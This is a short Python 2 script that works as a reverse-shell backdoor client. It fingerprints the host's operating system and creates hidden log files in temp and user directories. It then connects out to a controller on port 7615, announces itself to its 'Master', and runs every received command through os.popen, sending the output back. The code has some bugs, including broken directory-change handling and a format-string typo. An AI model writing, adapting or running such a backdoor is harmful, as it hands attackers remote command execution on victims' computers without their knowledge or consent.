import platform
import socket
import sys
import getpass
import time
import os
import ast


def getOS():
    print "getting OS"
    OS = platform.system()
    return OS
##################################


def getdist():
    print "getting distro"
    dist = platform.platform()
    return dist
##################################


def gather():
    print "gathering info"
    system = getOS()
    if(system == "Linux"):
        system = getdist()
    if(system == "Windows"):
        system = system
    return system
#################################


def storagepath(system):
    print "getting storage path"
    user = getpass.getuser()
    if(system == "Windows"):
        try:
            file = open("C:\users\%s\AppData\Local\Temp\.file.txt" % user, 'w')
        except Exception as e:
            print "failed 30"
            # I Don't really know where to go here
        try:
            file = open("C:\Users\%s\Documents\.systemConf.txt" % user, 'w')
        except Exception as e:
            print "failed 31"
    else:
        try:
            file = open("/tmp/.AT6B0KLM18.log", 'w')
        except Exception as e:
            print "failed 39"
            # Need an idea of where to go
        return file
################################


def call(system, home):
    print "Dialing out"
    port = 7615
    connectionType = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    log = storagepath(system)
    print ("%s" % log)
    try:
        connectionType.connect((home, port))
        command_handle(connectionType, system, log)
    except Exception as e:
        print ("Connection lost  %s" % e)
        log.write("%s" % e)
################################


def command_handle(connectionType, system, log):
    try:
        command = ""
        connectionType.send("Master, I am %s What is your command?" % system)
        connectionType.send("\n\n logs are kept in %s" % log)
        while(command != "exit"):
            # from here turn the recieved to commands
            command = connectionType.recv(4096)
            if "cd" in command:
                dir = str(command.partition(" ")[2])
                os.chdir(dir[2])
            connectionType.send(os.popen(("%s" % command)).read())
    except Exception as e:
        log.write("$s" % e)


def main():
    home = "0.0.0.0"
    system = gather()
    call(system, home)


main()
